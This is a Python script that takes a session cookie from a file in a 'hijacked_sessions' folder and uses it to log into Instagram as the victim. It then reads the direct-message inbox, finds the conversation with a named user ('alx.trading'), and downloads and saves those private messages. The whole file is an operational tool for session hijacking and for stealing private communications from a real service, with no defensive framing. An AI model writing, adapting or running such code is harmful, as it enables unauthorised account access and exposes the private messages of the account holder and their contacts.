#!/usr/bin/env python3
import json
import requests
import os
import sys
from datetime import datetime

def log(msg):
    print(f"[{datetime.now().strftime('%H:%M:%S')}] {msg}")
    sys.stdout.flush()

def main():
    log("🎯 Simple DM Extractor - Using Project Session")
    log("=" * 50)
    
    # Load session
    session_file = "/workspaces/sugarglitch-realops/hijacked_sessions/fresh_hijacked_session_1749169370.json"
    
    try:
        with open(session_file, 'r') as f:
            session_data = json.load(f)
        
        sessionid = None
        # Handle different session formats
        if 'cookies' in session_data:
            # Fresh hijacked session format
            cookies_list = session_data['cookies']
            for cookie in cookies_list:
                if cookie.get('name') == 'sessionid':
                    sessionid = cookie.get('value')
                    break
        else:
            # Original format
            for cookie in session_data:
                if cookie.get('name') == 'sessionid':
                    sessionid = cookie.get('value')
                    break
        
        if not sessionid:
            log("❌ No sessionid found")
            return
        
        log(f"✅ Found sessionid: {sessionid[:15]}...")
        
    except Exception as e:
        log(f"❌ Error loading session: {e}")
        return
    
    # Test session
    log("🧪 Testing session...")
    
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36'
    }
    
    cookies = {'sessionid': sessionid}
    
    try:
        response = requests.get('https://www.instagram.com/', 
                              cookies=cookies, 
                              headers=headers, 
                              timeout=10,
                              allow_redirects=True)
        
        log(f"Response status: {response.status_code}")
        log(f"Final URL: {response.url}")
        
        if 'login' in response.url.lower():
            log("❌ Session expired - redirected to login")
            return
        else:
            log("✅ Session seems valid")
        
    except Exception as e:
        log(f"❌ Error testing session: {e}")
        return
    
    # Try to get inbox
    log("📥 Getting inbox...")
    
    try:
        inbox_url = 'https://www.instagram.com/api/v1/direct_v2/inbox/'
        
        headers.update({
            'Accept': '*/*',
            'X-Requested-With': 'XMLHttpRequest',
        })
        
        response = requests.get(inbox_url, 
                              cookies=cookies, 
                              headers=headers, 
                              timeout=15)
        
        log(f"Inbox response: {response.status_code}")
        
        if response.status_code == 200:
            data = response.json()
            threads = data.get('inbox', {}).get('threads', [])
            log(f"✅ Found {len(threads)} threads")
            
            # Look for alx.trading
            target = "alx.trading"
            found = False
            
            for thread in threads:
                users = thread.get('users', [])
                for user in users:
                    if user.get('username') == target:
                        log(f"🎯 Found {target}!")
                        found = True
                        
                        # Extract messages
                        thread_id = thread.get('thread_id')
                        log(f"Getting messages from thread {thread_id}...")
                        
                        thread_url = f'https://www.instagram.com/api/v1/direct_v2/threads/{thread_id}/'
                        thread_response = requests.get(thread_url, 
                                                     cookies=cookies, 
                                                     headers=headers, 
                                                     timeout=15)
                        
                        if thread_response.status_code == 200:
                            thread_data = thread_response.json()
                            messages = thread_data.get('thread', {}).get('items', [])
                            log(f"✅ Got {len(messages)} messages!")
                            
                            # Save results
                            output = {
                                'target': target,
                                'extraction_time': datetime.now().isoformat(),
                                'total_messages': len(messages),
                                'messages': messages
                            }
                            
                            output_file = f"/workspaces/sugarglitch-realops/data/simple_extraction_{int(datetime.now().timestamp())}.json"
                            os.makedirs(os.path.dirname(output_file), exist_ok=True)
                            
                            with open(output_file, 'w', encoding='utf-8') as f:
                                json.dump(output, f, indent=2, ensure_ascii=False)
                            
                            log(f"✅ Saved to: {output_file}")
                            
                            # Show sample
                            if messages:
                                log("📝 First few messages:")
                                for i, msg in enumerate(messages[:3]):
                                    text = msg.get('text', '')[:50]
                                    log(f"  {i+1}. {text}")
                            
                            return
                        else:
                            log(f"❌ Failed to get thread: {thread_response.status_code}")
                        
                        break
                if found:
                    break
            
            if not found:
                log(f"❌ No conversation with {target} found")
                log("Available conversations:")
                for i, thread in enumerate(threads[:5]):
                    users = thread.get('users', [])
                    names = [u.get('username', 'unknown') for u in users]
                    log(f"  {i+1}. {', '.join(names)}")
        
        elif response.status_code == 401:
            log("❌ Unauthorized - session invalid")
        else:
            log(f"❌ Failed to get inbox: {response.status_code}")
            log(f"Response: {response.text[:200]}")
            
    except Exception as e:
        log(f"❌ Error getting inbox: {e}")

if __name__ == "__main__":
    main()
